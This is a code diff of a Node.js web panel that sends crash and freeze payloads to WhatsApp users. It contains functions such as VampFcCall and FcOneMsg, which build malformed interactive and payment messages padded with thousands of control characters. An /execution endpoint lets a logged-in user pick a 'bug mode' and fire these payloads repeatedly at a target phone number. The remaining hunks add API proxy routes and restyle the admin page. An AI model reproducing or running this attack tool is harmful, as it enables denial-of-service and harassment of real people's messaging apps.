@@ -1220,11 +1220,11 @@ async function FcOneMsg(sock, target) {
   const fconemsg = {
     requestPaymentMessage: {
       amount: {
-       value: 1,
-       offset: 0,
-       currencyCodeIso4217: "IDR",
-       requestFrom: target,
-       expiryTimestamp: Date.now() + 8000
+        value: 1,
+        offset: 0,
+        currencyCodeIso4217: "IDR",
+        requestFrom: target,
+        expiryTimestamp: Date.now() + 8000
       },
       contextInfo: {
         externalAdReply: {
@@ -1239,8 +1239,8 @@ async function FcOneMsg(sock, target) {
       }
     }
   };
-  
-    await sock.relayMessage(target, fconemsg, {
+
+  await sock.relayMessage(target, fconemsg, {
     participant: { jid: target },
     messageId: null,
     userJid: target,
@@ -1658,100 +1658,100 @@ async function VampSuperDelay(sock, target, mention = false, count = 30) {
 
 // fc call by venom
 let venomModsData = JSON.stringify({
-      status: true,
-      criador: "VenomMods",
-      resultado: {
-        type: "md",
-        ws: {
-          _events: { "CB:ib,,dirty": ["Array"] },
-          _eventsCount: 800000,
-          _maxListeners: 0,
-          url: "wss://web.whatsapp.com/ws/chat",
-          config: {
-            version: ["Array"],
-            browser: ["Array"],
-            waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
-            sockCectTimeoutMs: 20000,
-            keepAliveIntervalMs: 30000,
-            logger: {},
-            printQRInTerminal: false,
-            emitOwnEvents: true,
-            defaultQueryTimeoutMs: 60000,
-            customUploadHosts: [],
-            retryRequestDelayMs: 250,
-            maxMsgRetryCount: 5,
-            fireInitQueries: true,
-            auth: { Object: "authData" },
-            markOnlineOnsockCect: true,
-            syncFullHistory: true,
-            linkPreviewImageThumbnailWidth: 192,
-            transactionOpts: { Object: "transactionOptsData" },
-            generateHighQualityLinkPreview: false,
-            options: {},
-            appStateMacVerification: { Object: "appStateMacData" },
-            mobile: true
+  status: true,
+  criador: "VenomMods",
+  resultado: {
+    type: "md",
+    ws: {
+      _events: { "CB:ib,,dirty": ["Array"] },
+      _eventsCount: 800000,
+      _maxListeners: 0,
+      url: "wss://web.whatsapp.com/ws/chat",
+      config: {
+        version: ["Array"],
+        browser: ["Array"],
+        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
+        sockCectTimeoutMs: 20000,
+        keepAliveIntervalMs: 30000,
+        logger: {},
+        printQRInTerminal: false,
+        emitOwnEvents: true,
+        defaultQueryTimeoutMs: 60000,
+        customUploadHosts: [],
+        retryRequestDelayMs: 250,
+        maxMsgRetryCount: 5,
+        fireInitQueries: true,
+        auth: { Object: "authData" },
+        markOnlineOnsockCect: true,
+        syncFullHistory: true,
+        linkPreviewImageThumbnailWidth: 192,
+        transactionOpts: { Object: "transactionOptsData" },
+        generateHighQualityLinkPreview: false,
+        options: {},
+        appStateMacVerification: { Object: "appStateMacData" },
+        mobile: true
+      }
+    }
+  }
+});
+
+async function VampFcCall(sock, target, ptcp = true) {
+  let msg = await generateWAMessageFromContent(target, {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          header: {
+            title: "Vampire Boleh Telpon",
+            hasMediaAttachment: false
+          },
+          body: {
+            text: "\u0003".repeat(9999),
+          },
+          nativeFlowMessage: {
+            messageParamsJson: "",
+            buttons: [
+              { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
+              { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+              { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
+            ]
           }
         }
       }
-    });
-    
-async function VampFcCall(sock, target, ptcp = true) {
-      let msg = await generateWAMessageFromContent(target, {
-        viewOnceMessage: {
-          message: {
-            interactiveMessage: {
-              header: {
-                title: "Vampire Boleh Telpon",
-                hasMediaAttachment: false
-              },
-              body: {
-                text: "\u0003".repeat(9999),
-              },
-              nativeFlowMessage: {
-                messageParamsJson: "",
-                buttons: [
-                  { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
-                  { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
-                  { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
-                ]
-              }
-            }
-          }
-        }
-      }, {});
-
-      await sock.relayMessage(target, msg.message, ptcp ? {
-        participant: {
-          jid: target
-        }
-      } : {});
-
     }
+  }, {});
+
+  await sock.relayMessage(target, msg.message, ptcp ? {
+    participant: {
+      jid: target
+    }
+  } : {});
+
+}
 
 async function spacksfreeze(sock, target, count = 50) {
   await sock.relayMessage(target, {
@@ -3626,6 +3626,9 @@ app.use(cookieParser());
 app.use(express.json());
 app.use(express.static('public'));
 
+// Handle favicon.ico request to prevent 404 error
+app.get('/favicon.ico', (req, res) => res.status(204).end());
+
 // ==================== AUTH MIDDLEWARE ==================== //
 function requireAuth(req, res, next) {
   const username = req.cookies.sessionUser;
@@ -4208,33 +4211,33 @@ app.post("/execution", requireAuth, async (req, res) => {
 
     // Validasi mode bug
     const validModes = [
-  "delay",
-  "crash",
-  "fcandro",
-  "blank-ios",
-  "fcinvsios",
-  "force-close",
-  "delayv2",
-  "stuck",
-  "SqL-Exception",
-  "Neural-Hardcore",
-  "Trash-IOS",
-  "combo",
-  "CrashUi",
-  "blank-iphone",
-  "delay-tredict",
-  "carousel-crash",
-  "delay-xa",
-  "delay-vamp",
-  "spack-freeze",
-  "verload-fc",
-  "invisible-spam",
-  "delay-5gb",
-  "crash-beta",
-  "ivs-null",
-  "cosmo-uifc",
-  "fcbos"
-];
+      "delay",
+      "crash",
+      "fcandro",
+      "blank-ios",
+      "fcinvsios",
+      "force-close",
+      "delayv2",
+      "stuck",
+      "SqL-Exception",
+      "Neural-Hardcore",
+      "Trash-IOS",
+      "combo",
+      "CrashUi",
+      "blank-iphone",
+      "delay-tredict",
+      "carousel-crash",
+      "delay-xa",
+      "delay-vamp",
+      "spack-freeze",
+      "verload-fc",
+      "invisible-spam",
+      "delay-5gb",
+      "crash-beta",
+      "ivs-null",
+      "cosmo-uifc",
+      "fcbos"
+    ];
     if (!validModes.includes(mode)) {
       console.log(`[EXECUTION FAILED] Invalid mode: ${mode}`);
       return res.status(400).json({
@@ -4262,244 +4265,244 @@ app.post("/execution", requireAuth, async (req, res) => {
     try {
       if (mode === "delay") {
         for (let i = 0; i < 10; i++) {
-        bugResult = await delayinvisible(sock, 24, targetJid);
+          bugResult = await delayinvisible(sock, 24, targetJid);
         }
       } else if (mode === "crash") {
         for (let i = 0; i < 10; i++) {
-        bugResult = await forceandro(sock, targetJid);
+          bugResult = await forceandro(sock, targetJid);
         }
       } else if (mode === "fcandro") {
         for (let i = 0; i < 10; i++) {
-        bugResult = await androkill(sock, targetJid);
+          bugResult = await androkill(sock, targetJid);
         }
       } else if (mode === "blank-ios") {
         for (let i = 0; i < 10; i++) {
-        bugResult = await blankios(sock, targetJid);
+          bugResult = await blankios(sock, targetJid);
         }
       } else if (mode === "fcinvsios") {
         for (let i = 0; i < 10; i++) {
-        bugResult = await fcios(sock, targetJid);
+          bugResult = await fcios(sock, targetJid);
         }
       } else if (mode === "force-close") {
         for (let i = 0; i < 10; i++) {
-        bugResult = await forklos(sock, targetJid);
+          bugResult = await forklos(sock, targetJid);
         }
       } else if (mode === "delayv2") {
         for (let i = 0; i < 10; i++) {
-        bugResult = await hamzdelayhard(sock, 10, targetJid);
+          bugResult = await hamzdelayhard(sock, 10, targetJid);
         }
       } else if (mode === "stuck") {
         for (let i = 0; i < 10; i++) {
-        bugResult = await hamzblank(sock, 65, targetJid);
+          bugResult = await hamzblank(sock, 65, targetJid);
         }
       } else if (mode === "combo") {
         for (let i = 0; i < 10; i++) {
-        await androkill(sock, targetJid);
-        await sleep(1000);
-        await forklos(sock, targetJid);
-        await sleep(1000);
-        await CrashBeta(sock, targetJid);
-        await sleep(1000);
-        await VampSuperDelay(sock, targetJid);
+          await androkill(sock, targetJid);
+          await sleep(1000);
+          await forklos(sock, targetJid);
+          await sleep(1000);
+          await CrashBeta(sock, targetJid);
+          await sleep(1000);
+          await VampSuperDelay(sock, targetJid);
         }
         bugResult = { success: true };
 
       } else if (mode === "Trash-IOS") {
         for (let i = 0; i < 10; i++) {
-        bugResult = await TrashLocIOS(sock, targetJid);
-      }
+          bugResult = await TrashLocIOS(sock, targetJid);
+        }
       } else if (mode === "Neural-Hardcore") {
         for (let i = 0; i < 3; i++) {
-        bugResult = await XiosVirus(sock, targetJid);
+          bugResult = await XiosVirus(sock, targetJid);
         }
       } else if (mode === "SqL-Exception") {
         for (let i = 0; i < 10; i++) {
-        await SqLException(sock, targetJid);
-        await nasgor(sock, targetJid);
-        await iosOver(sock, 34, targetJid);
+          await SqLException(sock, targetJid);
+          await nasgor(sock, targetJid);
+          await iosOver(sock, 34, targetJid);
         }
         bugResult = { success: true };
 
       } else if (mode === "CrashUi") {
         for (let i = 0; i < 10; i++) {
-        await CrashUi(sock, targetJid);
-        await CrashUi(sock, targetJid);
-        await hamzblank(sock, 65, targetJid);
-        await hamzblank(sock, 65, targetJid);
-        await androkill(sock, targetJid);
-        await androkill(sock, targetJid);
-        await forceandro(sock, targetJid);
-        await CosmoPrivUiXFC(sock, targetJid);
-        await CosmoPrivUiXFC(sock, targetJid);
-        await CosmoPrivUiXFC(sock, targetJid);
-        await CosmoPrivUiXFC(sock, targetJid);
-        await forceandro(sock, targetJid);
-      }
+          await CrashUi(sock, targetJid);
+          await CrashUi(sock, targetJid);
+          await hamzblank(sock, 65, targetJid);
+          await hamzblank(sock, 65, targetJid);
+          await androkill(sock, targetJid);
+          await androkill(sock, targetJid);
+          await forceandro(sock, targetJid);
+          await CosmoPrivUiXFC(sock, targetJid);
+          await CosmoPrivUiXFC(sock, targetJid);
+          await CosmoPrivUiXFC(sock, targetJid);
+          await CosmoPrivUiXFC(sock, targetJid);
+          await forceandro(sock, targetJid);
+        }
         bugResult = { success: true };
 
       } else if (mode === "blank-iphone") {
         for (let i = 0; i < 10; i++) {
-        await VampireBlankIphone(sock,targetJid);
-        await VampireBlankIphone(sock,targetJid);
-        await VampireBlankIphone(sock,targetJid);
+          await VampireBlankIphone(sock, targetJid);
+          await VampireBlankIphone(sock, targetJid);
+          await VampireBlankIphone(sock, targetJid);
         }
         bugResult = { success: true };
 
       } else if (mode === "delay-tredict") {
         for (let i = 0; i < 10; i++) {
-        await TredictDelay(sock, targetJid);
-        await TredictDelay(sock, targetJid);
-        await TredictDelay(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await VampSuperDelay(sock, targetJid, true);
+          await TredictDelay(sock, targetJid);
+          await TredictDelay(sock, targetJid);
+          await TredictDelay(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await VampSuperDelay(sock, targetJid, true);
         }
         bugResult = { success: true };
 
       } else if (mode === "carousel-crash") {
         for (let i = 0; i < 10; i++) {
-        bugResult = await CardsCarousel(sock, targetJid);
-        bugResult = await CardsCarousel(sock, targetJid);
-        bugResult = await CardsCarousel(sock, targetJid);
-        bugResult = await CardsCarousel(sock, targetJid);
-        bugResult = await CardsCarousel(sock, targetJid);
-        bugResult = await CardsCarousel(sock, targetJid);
-        bugResult = await CardsCarousel(sock, targetJid);
-        bugResult = await CardsCarousel(sock, targetJid);
-        bugResult = await CardsCarousel(sock, targetJid);
+          bugResult = await CardsCarousel(sock, targetJid);
+          bugResult = await CardsCarousel(sock, targetJid);
+          bugResult = await CardsCarousel(sock, targetJid);
+          bugResult = await CardsCarousel(sock, targetJid);
+          bugResult = await CardsCarousel(sock, targetJid);
+          bugResult = await CardsCarousel(sock, targetJid);
+          bugResult = await CardsCarousel(sock, targetJid);
+          bugResult = await CardsCarousel(sock, targetJid);
+          bugResult = await CardsCarousel(sock, targetJid);
         }
       } else if (mode === "delay-xa") {
         for (let i = 0; i < 10; i++) {
-        await XaDelayMaker(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await TredictDelay(sock, targetJid);
-        await TredictDelay(sock, targetJid);
-        await TredictDelay(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await VampSuperDelay(sock, targetJid, true);
+          await XaDelayMaker(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await TredictDelay(sock, targetJid);
+          await TredictDelay(sock, targetJid);
+          await TredictDelay(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await VampSuperDelay(sock, targetJid, true);
         }
         bugResult = { success: true };
 
       } else if (mode === "delay-vamp") {
         for (let i = 0; i < 10; i++) {
-        await VampSuperDelay(sock, targetJid, true);
-        await VampSuperDelay(sock, targetJid, true);
-        await VampSuperDelay(sock, targetJid, true);
-        await VampSuperDelay(sock, targetJid, true);
-        await VampSuperDelay(sock, targetJid, true);
-        await TredictDelay(sock, targetJid);
-        await TredictDelay(sock, targetJid);
-        await TredictDelay(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await XaDelayMaker(sock, targetJid);
-        await VampSuperDelay(sock, targetJid, true);
+          await VampSuperDelay(sock, targetJid, true);
+          await VampSuperDelay(sock, targetJid, true);
+          await VampSuperDelay(sock, targetJid, true);
+          await VampSuperDelay(sock, targetJid, true);
+          await VampSuperDelay(sock, targetJid, true);
+          await TredictDelay(sock, targetJid);
+          await TredictDelay(sock, targetJid);
+          await TredictDelay(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await XaDelayMaker(sock, targetJid);
+          await VampSuperDelay(sock, targetJid, true);
         }
         bugResult = { success: true };
 
       } else if (mode === "spack-freeze") {
         for (let i = 0; i < 10; i++) {
-        await spacksfreeze(sock, targetJid);
-        await VampireBlankIphone(sock,targetJid);
-        await VampireBlankIphone(sock,targetJid);
-        await VampireBlankIphone(sock,targetJid);
-        await CrashUi(sock, targetJid);
-        await CrashUi(sock, targetJid);
-        await hamzblank(sock, 65, targetJid);
-        await hamzblank(sock, 65, targetJid);
-        await androkill(sock, targetJid);
-        await androkill(sock, targetJid);
-        await forceandro(sock, targetJid);
-        await forceandro(sock, targetJid);
-        await forceandro(sock, targetJid);
-        await CosmoPrivUiXFC(sock, targetJid);
-        await CosmoPrivUiXFC(sock, targetJid);
-        await CosmoPrivUiXFC(sock, targetJid);
+          await spacksfreeze(sock, targetJid);
+          await VampireBlankIphone(sock, targetJid);
+          await VampireBlankIphone(sock, targetJid);
+          await VampireBlankIphone(sock, targetJid);
+          await CrashUi(sock, targetJid);
+          await CrashUi(sock, targetJid);
+          await hamzblank(sock, 65, targetJid);
+          await hamzblank(sock, 65, targetJid);
+          await androkill(sock, targetJid);
+          await androkill(sock, targetJid);
+          await forceandro(sock, targetJid);
+          await forceandro(sock, targetJid);
+          await forceandro(sock, targetJid);
+          await CosmoPrivUiXFC(sock, targetJid);
+          await CosmoPrivUiXFC(sock, targetJid);
+          await CosmoPrivUiXFC(sock, targetJid);
         }
         bugResult = { success: true };
       } else if (mode === "verload-fc") {
         for (let i = 0; i < 10; i++) {
-        await VerloadXDelayFc(sock, targetJid);
-        await VerloadXDelayFc(sock, targetJid);
-        await VerloadXDelayFc(sock, targetJid);
-        await VerloadXDelayFc(sock, targetJid);
-        await VerloadXDelayFc(sock, targetJid);
-        await VerloadXDelayFc(sock, targetJid, true);
-        await VerloadXDelayFc(sock, targetJid, true);
-        await VerloadXDelayFc(sock, targetJid, true);
-        await VerloadXDelayFc(sock, targetJid, true);
-        await VerloadXDelayFc(sock, targetJid, true);
-        await delay5GB(sock, targetJid, true);
-        await delay5GB(sock, targetJid, true);
-        await delay5GB(sock, targetJid, true);
-        await delay5GB(sock, targetJid, true);
-        await delay5GB(sock, targetJid, true);
-        await invisibleSpam(sock, targetJid);
-        await invisibleSpam(sock, targetJid);
-        await invisibleSpam(sock, targetJid);
-        await invisibleSpam(sock, targetJid);
-        await invisibleSpam(sock, targetJid);
-        await CrashBeta(sock, targetJid);
-        await CrashBeta(sock, targetJid);
-        await CrashBeta(sock, targetJid);
-        await CrashBeta(sock, targetJid);
-        await CrashBeta(sock, targetJid);
+          await VerloadXDelayFc(sock, targetJid);
+          await VerloadXDelayFc(sock, targetJid);
+          await VerloadXDelayFc(sock, targetJid);
+          await VerloadXDelayFc(sock, targetJid);
+          await VerloadXDelayFc(sock, targetJid);
+          await VerloadXDelayFc(sock, targetJid, true);
+          await VerloadXDelayFc(sock, targetJid, true);
+          await VerloadXDelayFc(sock, targetJid, true);
+          await VerloadXDelayFc(sock, targetJid, true);
+          await VerloadXDelayFc(sock, targetJid, true);
+          await delay5GB(sock, targetJid, true);
+          await delay5GB(sock, targetJid, true);
+          await delay5GB(sock, targetJid, true);
+          await delay5GB(sock, targetJid, true);
+          await delay5GB(sock, targetJid, true);
+          await invisibleSpam(sock, targetJid);
+          await invisibleSpam(sock, targetJid);
+          await invisibleSpam(sock, targetJid);
+          await invisibleSpam(sock, targetJid);
+          await invisibleSpam(sock, targetJid);
+          await CrashBeta(sock, targetJid);
+          await CrashBeta(sock, targetJid);
+          await CrashBeta(sock, targetJid);
+          await CrashBeta(sock, targetJid);
+          await CrashBeta(sock, targetJid);
         }
         bugResult = { success: true };
 
       } else if (mode === "invisible-spam") {
         for (let i = 0; i < 10; i++) {
-        await invisibleSpam(sock, targetJid);
-        await invisibleSpam(sock, targetJid);
-        await invisibleSpam(sock, targetJid);
-        await invisibleSpam(sock, targetJid);
-        await invisibleSpam(sock, targetJid);
+          await invisibleSpam(sock, targetJid);
+          await invisibleSpam(sock, targetJid);
+          await invisibleSpam(sock, targetJid);
+          await invisibleSpam(sock, targetJid);
+          await invisibleSpam(sock, targetJid);
         }
         bugResult = { success: true };
 
       } else if (mode === "delay-5gb") {
         for (let i = 0; i < 10; i++) {
-        await delay5GB(sock, targetJid, true);
+          await delay5GB(sock, targetJid, true);
         }
         bugResult = { success: true };
 
       } else if (mode === "crash-beta") {
         for (let i = 0; i < 10; i++) {
-        await CrashBeta(sock, targetJid);
+          await CrashBeta(sock, targetJid);
         }
         bugResult = { success: true };
 
       } else if (mode === "ivs-null") {
         for (let i = 0; i < 10; i++) {
-        await IvsNull(sock, targetJid);
+          await IvsNull(sock, targetJid);
         }
         bugResult = { success: true };
 
       } else if (mode === "cosmo-uifc") {
-          for (let i = 0; i < 10; i++) {
-        await CosmoPrivUiXFC(sock, targetJid);
-          }
+        for (let i = 0; i < 10; i++) {
+          await CosmoPrivUiXFC(sock, targetJid);
+        }
         bugResult = { success: true };
 
       } else if (mode === "fcbos") {
         for (let i = 0; i < 10; i++) {
-        await FcOneMsg(sock, targetJid);
-        await FcOneMsg(sock, targetJid);
-        await FcOneMsg(sock, targetJid);
-        await FcOneMsg(sock, targetJid);
-        await VampFcCall(sock, target, ptcp = true);
-        await VampFcCall(sock, target, ptcp = true);
-        await VampFcCall(sock, target, ptcp = true);
-        await VampFcCall(sock, target, ptcp = true);
+          await FcOneMsg(sock, targetJid);
+          await FcOneMsg(sock, targetJid);
+          await FcOneMsg(sock, targetJid);
+          await FcOneMsg(sock, targetJid);
+          await VampFcCall(sock, target, ptcp = true);
+          await VampFcCall(sock, target, ptcp = true);
+          await VampFcCall(sock, target, ptcp = true);
+          await VampFcCall(sock, target, ptcp = true);
         }
         bugResult = { success: true };
 
@@ -4631,6 +4634,63 @@ app.get("/api/confess-logs", requireAuth, (req, res) => {
   });
 
   res.json({ success: true, logs: userLogs });
+});
+
+// ==================== API PROXY ROUTES (CORS FIX) ==================== //
+
+app.get("/api/proxy/ytsearch", async (req, res) => {
+  try {
+    const { q, limit } = req.query;
+    const response = await axios.get('https://api.dyysilence.biz.id/api/search/ytsearch', { params: { q, limit } });
+    res.json(response.data);
+  } catch (error) {
+    console.error("Proxy Error (ytsearch):", error.message);
+    res.status(500).json({ status: false, message: error.message });
+  }
+});
+
+app.get("/api/proxy/ytmp3", async (req, res) => {
+  try {
+    const { url, quality } = req.query;
+    const response = await axios.get('https://api.dyysilence.biz.id/api/downloader/ytmp3', { params: { url, quality } });
+    res.json(response.data);
+  } catch (error) {
+    console.error("Proxy Error (ytmp3):", error.message);
+    res.status(500).json({ status: false, message: error.message });
+  }
+});
+
+app.get("/api/proxy/tiktok", async (req, res) => {
+  try {
+    const { url } = req.query;
+    const response = await axios.get('https://api.dyysilence.biz.id/api/downloader/tiktok', { params: { url } });
+    res.json(response.data);
+  } catch (error) {
+    console.error("Proxy Error (tiktok):", error.message);
+    res.status(500).json({ status: false, message: error.message });
+  }
+});
+
+app.get("/api/proxy/pinterest", async (req, res) => {
+  try {
+    const { q, limit } = req.query;
+    const response = await axios.get('https://api.dyysilence.biz.id/api/search/pinterestsearch', { params: { q, limit } });
+    res.json(response.data);
+  } catch (error) {
+    console.error("Proxy Error (pinterest):", error.message);
+    res.status(500).json({ status: false, message: error.message });
+  }
+});
+
+app.get("/api/proxy/tiktoksearch", async (req, res) => {
+  try {
+    const { q, count } = req.query;
+    const response = await axios.get('https://api.dyysilence.biz.id/api/search/tiktok', { params: { q, count } });
+    res.json(response.data);
+  } catch (error) {
+    console.error("Proxy Error (tiktoksearch):", error.message);
+    res.status(500).json({ status: false, message: error.message });
+  }
 });
 
 app.post("/api/send-confess", requireAuth, async (req, res) => {
@@ -5763,14 +5823,14 @@ app.get("/adduser", requireAuth, (req, res) => {
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
     <style>
-        /* Perubahan Tema ke Lime Apple Green */
+        /* Perubahan Tema ke Cyber Red Performance */
         :root {
-            --primary: #32CD32; /* Lime Green */
-            --secondary: #228B22; /* Forest Green */
-            --accent: #adff2f; /* Green Yellow */
-            --bg-dark: #050505;
-            --glass: rgba(255, 255, 255, 0.03);
-            --glass-border: rgba(255, 255, 255, 0.1);
+            --primary: #ff0000; /* Pure Red */
+            --secondary: #8b0000; /* Dark Red */
+            --accent: #ff4d4d; /* Bright Red */
+            --bg-dark: #080808;
+            --glass: rgba(0, 0, 0, 0.7);
+            --glass-border: rgba(255, 0, 0, 0.2);
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -5785,15 +5845,15 @@ app.get("/adduser", requireAuth, (req, res) => {
             overflow-y: auto;
             overflow-x: hidden;
             background-image: 
-                radial-gradient(circle at 10% 20%, rgba(50, 205, 50, 0.05) 0%, transparent 40%),
-                radial-gradient(circle at 90% 80%, rgba(173, 255, 47, 0.05) 0%, transparent 40%);
+                radial-gradient(circle at 10% 20%, rgba(255, 0, 0, 0.1) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(139, 0, 0, 0.1) 0%, transparent 40%);
         }
 
         #particles {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
             z-index: 0;
-            opacity: 0.5;
+            opacity: 0.3;
         }
 
         .content {
@@ -5803,7 +5863,7 @@ app.get("/adduser", requireAuth, (req, res) => {
             margin: 0 auto;
         }
 
-        /* Header Mewah */
+        /* Header Mewah - Cyberpunk Style */
         .header {
             text-align: center;
             margin-bottom: 40px;
@@ -5812,33 +5872,34 @@ app.get("/adduser", requireAuth, (req, res) => {
         
         .header h2 {
             font-family: 'Orbitron', sans-serif;
-            font-size: 28px;
-            font-weight: 700;
-            background: linear-gradient(to right, #fff, var(--primary));
+            font-size: 32px;
+            font-weight: 900;
+            background: linear-gradient(to bottom, #fff 30%, var(--primary) 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             text-transform: uppercase;
-            letter-spacing: 4px;
+            letter-spacing: 6px;
             margin-bottom: 15px;
-            filter: drop-shadow(0 0 15px rgba(50, 205, 50, 0.3));
+            filter: drop-shadow(0 0 20px rgba(255, 0, 0, 0.5));
         }
 
         .header p {
-            color: #888;
-            font-size: 14px;
-            letter-spacing: 1px;
-            font-weight: 300;
+            color: #666;
+            font-size: 12px;
+            letter-spacing: 3px;
+            font-weight: 400;
+            text-transform: uppercase;
         }
 
-        /* Form Container - Glassmorphism Ultra */
+        /* Form Container - Obsidian Glassmorphism */
         .form-container {
-            background: rgba(15, 15, 15, 0.6);
+            background: rgba(10, 10, 10, 0.85);
             border: 1px solid var(--glass-border);
-            padding: 40px;
-            border-radius: 30px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
+            padding: 45px;
+            border-radius: 40px 5px 40px 5px; /* Asymmetric design */
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), inset 0 0 20px rgba(255, 0, 0, 0.05);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
             position: relative;
